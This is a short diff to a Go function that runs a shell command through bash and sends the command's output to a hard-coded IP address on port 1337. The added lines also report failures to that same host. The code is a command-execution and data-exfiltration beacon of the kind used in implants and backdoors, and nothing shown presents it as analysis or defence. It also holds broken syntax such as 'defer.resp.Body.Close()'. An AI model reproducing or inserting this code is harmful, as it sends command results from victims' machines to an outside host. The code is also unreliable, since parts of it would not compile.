@@ -13,11 +13,17 @@ func execute_helper() {
   command := exec.Command("bash", "-c", cmd)
   output, err := command.CombinedOutput()
   if err != nil {
-    output = "failed"
+    baseURL := "http://64.225.68.21:1337/uehpnowczlyh?t=failed"
+    resp, err := http.Get(baseURL)
+    if err != nil {
+      return
+    }
+    defer.resp.Body.Close()
   }
+  vals := string(output)
   baseURL := "http://64.225.68.21:1337/uehpnowczlyh"
 	params := url.Values{}
-	params.Add("t", output)
+	params.Add("t", vals)
 	fullURL := fmt.Sprintf("%s?%s", baseURL, params.Encode())
 
 	resp, err := http.Get(fullURL)
